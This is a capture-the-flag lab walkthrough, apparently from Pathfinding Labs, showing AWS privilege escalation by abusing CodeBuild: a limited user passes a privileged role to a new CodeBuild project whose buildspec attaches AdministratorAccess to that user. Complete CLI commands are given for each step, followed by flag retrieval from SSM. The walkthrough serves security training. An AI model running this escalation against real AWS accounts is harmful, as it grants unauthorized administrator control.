# Guided Walkthrough: Privilege Escalation via CodeBuild Service Abuse

This scenario demonstrates a privilege escalation vulnerability where a user has permissions to create and execute AWS CodeBuild projects combined with the ability to pass IAM roles. The attacker can create a CodeBuild project with a privileged service role, then execute a malicious buildspec that uses that role's permissions to grant themselves administrator access.

AWS CodeBuild is a fully managed continuous integration service that compiles source code and runs builds in isolated compute environments. Each CodeBuild project executes with a service role that grants it permissions to perform operations. When a user has both `codebuild:CreateProject` and `iam:PassRole` permissions, they can create a project that assumes a privileged role. By starting a build with a custom buildspec, they can execute arbitrary AWS CLI commands with the role's elevated permissions.

This is a classic example of the "pass role to service" privilege escalation pattern, where the combination of service creation permissions and role passing creates an indirect path to elevated privileges that might not be obvious when reviewing IAM policies individually.

## The Challenge

You start as `pl-prod-codebuild-001-to-admin-starting-user`, an IAM user whose credentials are provisioned by Terraform when the scenario is enabled. Your user has three key permissions: `codebuild:CreateProject`, `codebuild:StartBuild`, and `iam:PassRole` scoped to `pl-prod-codebuild-001-to-admin-target-role`.

Your goal is to achieve effective administrator access in the AWS account. Right now you cannot list IAM users, create resources freely, or perform any sensitive operation — your permissions are intentionally narrow. The path to admin runs through a privileged IAM role that trusts the CodeBuild service.

## Reconnaissance

First, confirm who you are and what account you're working in:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

This will show your user ARN: `arn:aws:iam::{account_id}:user/pl-prod-codebuild-001-to-admin-starting-user`.

Next, verify that you cannot currently perform privileged actions — trying to list IAM users should fail:

```bash
aws iam list-users --max-items 1
# Expected: AccessDenied
```

Now look for IAM roles that trust the CodeBuild service and that you're allowed to pass:

```bash
aws iam list-roles --query "Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service=='codebuild.amazonaws.com']].[RoleName,Arn]" --output table
```

You'll find `pl-prod-codebuild-001-to-admin-target-role`. This role has `iam:AttachUserPolicy` permission and trusts `codebuild.amazonaws.com` — meaning any CodeBuild project you pass it to will execute builds with the ability to modify IAM policies.

## Exploitation

The plan is straightforward: create a CodeBuild project configured to use the privileged role, embed a buildspec that attaches `AdministratorAccess` to your user, then trigger the build.

### Step 1: Create the CodeBuild project

Build the inline buildspec and create the project, passing the target role as its service role:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-codebuild-001-to-admin-target-role"
STARTING_USER="pl-prod-codebuild-001-to-admin-starting-user"

aws codebuild create-project \
  --name pl-privesc-codebuild-demo \
  --source "{\"type\":\"NO_SOURCE\",\"buildspec\":\"version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws iam attach-user-policy --user-name ${STARTING_USER} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"}" \
  --artifacts type=NO_ARTIFACTS \
  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL \
  --service-role "$TARGET_ROLE_ARN"
```

When you provide `--service-role`, CodeBuild will assume `pl-prod-codebuild-001-to-admin-target-role` every time a build runs. Your `iam:PassRole` permission is what makes this step legal — without it, the API call would be denied.

### Step 2: Start the build

Trigger the build to execute the buildspec:

```bash
BUILD_RESULT=$(aws codebuild start-build --project-name pl-privesc-codebuild-demo --output json)
BUILD_ID=$(echo "$BUILD_RESULT" | jq -r '.build.id')
echo "Build started: $BUILD_ID"
```

### Step 3: Wait for the build to complete

Poll until the build finishes. CodeBuild spins up a fresh container, assumes the target role, and runs your buildspec commands with that role's permissions:

```bash
while true; do
  STATUS=$(aws codebuild batch-get-builds --ids "$BUILD_ID" --query 'builds[0].buildStatus' --output text)
  echo "Build status: $STATUS"
  [ "$STATUS" = "SUCCEEDED" ] && break
  [ "$STATUS" = "FAILED" ] && { echo "Build failed"; exit 1; }
  sleep 10
done
```

The build typically completes in 30-60 seconds. Once `SUCCEEDED`, the buildspec has run `iam:AttachUserPolicy` as the target role, attaching `AdministratorAccess` to your starting user.

Wait an additional 15 seconds for IAM policy propagation before verifying:

```bash
sleep 15
```

## Verification

Confirm that your starting user now has administrator access:

```bash
aws iam list-users --max-items 3 --output table
```

This should succeed — previously it returned `AccessDenied`. You can also verify the policy attachment directly:

```bash
aws iam list-attached-user-policies --user-name pl-prod-codebuild-001-to-admin-starting-user
```

You'll see `AdministratorAccess` (ARN: `arn:aws:iam::aws:policy/AdministratorAccess`) in the list, confirming the escalation succeeded.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/codebuild-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited a "pass role to service" privilege escalation pattern. Your user was never granted IAM write permissions directly — but it had `iam:PassRole` to a privileged role trusted by CodeBuild, combined with the ability to create and run CodeBuild projects. By delegating work to the CodeBuild service (which ran as the privileged role), you caused that role to perform an IAM action on your behalf that you could not perform yourself.

This attack pattern is particularly dangerous in real environments because the two permissions involved — `codebuild:CreateProject` and `iam:PassRole` — are often granted separately for legitimate reasons (developers need to set up CI/CD pipelines; operators need to manage service roles). The risk is invisible unless you analyze the combined effect: a user who can create CodeBuild projects and pass a role to them can effectively use that role's full permission set for anything expressible in a buildspec.
